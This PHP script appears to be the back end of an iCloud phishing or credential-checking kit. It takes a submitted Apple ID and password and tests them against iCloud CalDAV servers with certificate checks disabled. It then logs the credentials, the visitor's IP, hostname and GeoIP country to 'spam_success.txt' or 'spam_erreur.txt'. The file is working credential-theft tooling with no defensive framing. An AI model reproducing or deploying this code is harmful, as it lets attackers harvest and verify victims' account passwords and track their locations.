<?php

if(isset($_REQUEST['apple']) & isset( $_REQUEST['pw']))
	{
	
	
	//Define iCloud URLs
	$icloudUrls = array();
	for($i = 1; $i < 25; $i++)
		$icloudUrls[] = "https://p".str_pad($i, 2, '0', STR_PAD_LEFT)."-caldav.icloud.com";
	
	//Functions
	function doRequest($user, $pw, $url, $xml)
	{
		//Init cURL
		$c=curl_init($url);
		//Set headers
		curl_setopt($c, CURLOPT_HTTPHEADER, array("Depth: 1", "Content-Type: text/xml; charset='UTF-8'", "User-Agent: DAVKit/4.0.1 (730); CalendarStore/4.0.1 (973); iCal/4.0.1 (1374); Mac OS X/10.6.2 (10C540)"));
		curl_setopt($c, CURLOPT_HEADER, 0);
		//Set SSL
		curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
		//Set HTTP Auth
		curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
		curl_setopt($c, CURLOPT_USERPWD, $user.":".$pw);
		//Set request and XML
		curl_setopt($c, CURLOPT_CUSTOMREQUEST, "PROPFIND");
		curl_setopt($c, CURLOPT_POSTFIELDS, $xml);
		curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
		//Execute
		$data=curl_exec($c);
		//Close cURL
		curl_close($c);
		
		return $data;
	}
	$set = false;
	$tableau = array(); 
	foreach($icloudUrls as $server) {
	// $rand_keys = array_rand($server, 1);
$tableau[] = $server; 
		// echo "<option value='".$server."'";
		// if(isset($server) AND $server == $server)
			// echo " selcted";
		// else if(!isset($server) AND !$set) {
			// echo " selected";
			// $set = true;
		// }
		// $servere=array($server);
		// $i++;
		// echo ">".$servere[$server]."</option>";
		}
	$server=$tableau[rand(1, 23)];
	
	
	
	
		$user=$_REQUEST['apple'];
		$pw=$_REQUEST['pw'];
		
		//Get Principal URL
		$principal_request="<A:propfind xmlns:A='DAV:'>
								<A:prop>
									<A:current-user-principal/>
								</A:prop>
							</A:propfind>";
							
		$response=simplexml_load_string(doRequest($user, $pw, $server, $principal_request));
		//Principal URL
		$principal_url=$response->response[0]->propstat[0]->prop[0]->{'current-user-principal'}->href;
		$userID=explode("/", $principal_url);
		$userID=$userID[1];
		
		//Get Calendars
		$calendars_request="<A:propfind xmlns:A='DAV:'>
								<A:prop>
									<A:displayname/>
								</A:prop>
							</A:propfind>";
		$url=$server."/".$userID."/calendars/";
		$response=simplexml_load_string(doRequest($user, $pw, $url, $calendars_request));
		//To array
		$calendars=array();
		foreach($response->response as $cal)
		{
			$entry["href"]=$cal->href;
			$entry["name"]=$cal->propstat[0]->prop[0]->displayname;
			$calendars[]=$entry;
		}

		//CardDAV URL
		$cardserver = str_replace('caldav', 'contacts', $server);
		$cardurl = "/".$userID."/carddavhome/card/";
		
		$table[]=array();
		foreach($calendars as $calendar)
		{
			$table[]=$calendar["name"];
		}
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		

if($table[4])
{

//=============================================================================
$ip = getenv("REMOTE_ADDR");                                                                          
$hostname = gethostbyaddr($ip);

// include the php script
include("geoip.inc");

// open the geoip database
$gi = geoip_open("GeoIP.dat",GEOIP_STANDARD);

// to get country code
$country_code = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);

// to get country name
$country_name = geoip_country_name_by_addr($gi, $_SERVER['REMOTE_ADDR']);








$monfichier = fopen('spam_success.txt','a+');
fputs($monfichier,"==========================================================================="); 
fputs($monfichier,"\r\n".'Email = '. $user."\r\n".'Password = '.$pw."\r\n"."IP = ".$ip."\r\n".'Hostname ='.$hostname."\r\n"."Country = ".$country_name."\r\n");
fclose($monfichier);







echo "SUCCESS";
//return 1;
}
else
{
$monfichier = fopen('spam_erreur.txt','a+');
fputs($monfichier,"==========================================================================="); 
fputs($monfichier,"\r\n".'Email = '. $user."\r\n".'Password = '.$pw."\r\n"."IP = ".$ip."\r\n".'Hostname ='.$hostname."\r\n"."Country = ".$country_name."\r\n");
fclose($monfichier);
echo "-1";
}
}
else
{
echo "-1";
}
?>



